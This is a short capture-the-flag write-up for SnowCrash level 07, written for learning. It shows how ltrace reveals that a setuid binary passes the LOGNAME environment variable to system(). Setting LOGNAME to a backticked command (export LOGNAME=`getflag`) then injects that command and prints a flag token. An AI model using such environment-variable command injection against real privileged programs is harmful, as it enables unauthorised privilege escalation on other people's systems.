## Level 07

## Clues

```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$
```

Another executable to trick

```
level07@SnowCrash:~$ ./level07
level07
```

It print "level07", maybe it is printing the current user ?

Lets see what it calls :

```
level07@SnowCrash:~$ ltrace ./level07 
...                                                                                                              = 0
getenv("LOGNAME")   //     BIG MISTAKE                                                                                                                                                       = "`getflag`"
asprintf(0xbffff744, 0x8048688, 0xbfffff67, 0xb7e5ee55, 0xb7fed280)                                                                                                            = 20
system("/bin/echo `getflag` "Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
...
level07@SnowCrash:~$ 
```



![Snowcrash](./BIG%20MISTAKE%20GIF.gif)
```
getenv("LOGNAME")
```

## Solution

Very easy level, the executable seems to be using the LOGNAME environnement variable to print the current user.


So the solution is pretty easy


```
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$
```

Easy one


## What i learned

More curiosity

More ltrace and strace utility